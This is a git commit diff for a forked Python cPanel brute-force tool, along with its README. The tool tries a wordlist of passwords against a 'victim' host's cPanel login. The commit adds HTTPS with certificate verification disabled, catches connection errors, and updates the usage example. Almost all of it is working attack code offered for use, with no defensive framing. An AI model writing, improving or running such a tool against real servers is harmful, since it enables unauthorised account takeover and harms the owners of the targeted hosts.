488058db90e53c851d784a4961cd27bd41042e72
dalim.cepic <cepicdalim@gmail.com>
2024-04-26 18:37:19 +0300

    SSL Support added

--- CPanelBruteForce.py
+++ CPanelBruteForce.py
@@ -3,6 +3,7 @@ import base64
 import socket
 import sys
 import urllib.request
+import ssl
 
 '''
 
@@ -17,16 +18,24 @@ import urllib.request
 
 '''
 
+context = ssl._create_unverified_context()
+url = ''
 def main():
     parser = argparse.ArgumentParser(description='Cpanel Password Brute Force Tool')
     parser.add_argument('host', help='victim Host (127.0.0.1)')
+    parser.add_argument('ssl', help='ssl true or false (default is true)')
     parser.add_argument('user', help='User Name (demo)')
     parser.add_argument('port', type=int, help='Port of Cpanel (2082)')
     parser.add_argument('list', help='File Of password list (list.txt)')
     parser.add_argument('file', help='file for save password (password.txt)')
     args = parser.parse_args()
+    global url
+    if args.ssl == 'TRUE' or args.ssl == 'true':
+        url = f"https://{args.host}:{args.port}"
+    else:
+        url = f"http://{args.host}:{args.port}"
 
-    url = f"http://{args.host}:{args.port}"
+    print(f"\n [~] Start Brute Force on {url} \n")
 
     with open(args.list, 'r') as passfile:
         passwords = passfile.readlines()
@@ -34,10 +43,17 @@ def main():
     for passwd in passwords:
         passwd = passwd.strip()
         print(f"\n [~] Try Password : {passwd} \n")
-        brut(args.host, args.port, args.user, passwd)
+        try:
+            brut(args.host, args.port, args.user, passwd)
+        except:
+            print("\n [-] Error while trying password: {passwd} \n")
+        
 
 def brut(host, port, user, passwd):
-    authx = base64.b64encode(f"{user}:{passwd}".encode('ascii')).decode('ascii')
+    global url
+    global context
+
+    authx = base64.b64encode(f"{user}:{passwd}".encode('utf-8')).decode('ascii')
     print(authx)
     try:
         sock = socket.create_connection((host, port))
@@ -50,7 +66,7 @@ def brut(host, port, user, passwd):
     req.add_header('Connection', 'Close')
 
     try:
-        with urllib.request.urlopen(req) as response:
+        with urllib.request.urlopen(req, context=context) as response:
             answer = response.read().decode('utf-8')
     except urllib.error.HTTPError as e:
         answer = e.read().decode('utf-8')
--- README.md
+++ README.md
@@ -1,11 +1,17 @@
+# Original Repository
+https://github.com/hanicraft/CpanelBruteforce/fork
+
+
+This fork has SSL capability and more relaible for socket errors
+
 # CpanelBruteforce
 a simple and easy cpanel brute forcer
 
 # usage
 python CPanelBruteForce.py -h (shows help)
 
-python CPanelBruteForce.py host user port password list output
+python CPanelBruteForce.py host use-ssl user port password list output
 
 for example
 
-python CPanelBruteForce.py example.com admin 8080 password.txt cracked.txt
+python CPanelBruteForce.py example.com true admin 8080 password.txt cracked.txt
